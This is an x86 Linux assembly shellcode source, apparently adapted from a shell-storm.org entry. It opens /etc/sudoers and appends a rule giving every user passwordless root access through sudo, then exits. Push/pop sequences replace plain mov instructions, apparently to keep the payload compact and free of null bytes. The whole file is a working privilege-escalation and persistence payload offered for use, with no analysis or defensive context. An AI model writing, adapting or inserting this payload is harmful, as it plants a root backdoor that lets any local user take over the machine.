;http://shell-storm.org/shellcode/files/shellcode-62.php
global _start

section .text


get_eip: mov edi, [esp]
         ret

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	sub eax,eax
	call get_eip
	lea ebx , [edi+5]
	jmp etc_sudoers
	file_open db "/etc/sudoers" , 0x00
etc_sudoers:
	;add cx, 0x401
	push word 0x401
	pop word cx
	;add al, 0x05
	push 0x05
	pop eax
	int 0x80

	mov ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	sub eax, eax
	call get_eip
	lea ecx , [edi+5]
	jmp write_to_file	
	str_to_write db "ALL ALL=(ALL) NOPASSWD: ALL" , 0x0a, 0x00

write_to_file:
	;mov ecx, esp
	;mov dl, 0x1c
	push  0x1c
	pop edx
	
	;mov al, 0x04
	push 0x4
	pop eax

	int 0x80

	;close(file)
	; mov al,0x06
	push 0x6
	pop eax
	int 0x80

	;exit(0);
	sub ebx, ebx
	;mov al, 0x01
	push 0x1
	pop eax
	int 0x80

